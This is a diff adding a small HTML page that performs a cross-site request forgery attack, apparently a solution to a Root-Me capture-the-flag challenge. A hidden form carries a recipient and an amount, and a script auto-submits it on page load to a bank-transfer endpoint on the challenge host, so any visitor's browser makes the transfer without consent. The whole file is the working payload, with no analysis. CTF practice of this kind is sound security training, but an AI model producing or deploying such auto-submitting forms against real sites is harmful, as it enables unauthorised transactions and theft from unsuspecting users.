@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transfer</title>
+</head>
+<body>
+    <form id="transferForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="caca">
+        <input type="hidden" name="amount" value="10">
+    </form>
+
+    <script>
+        document.getElementById('transferForm').submit();
+    </script>
+</body>
+</html>
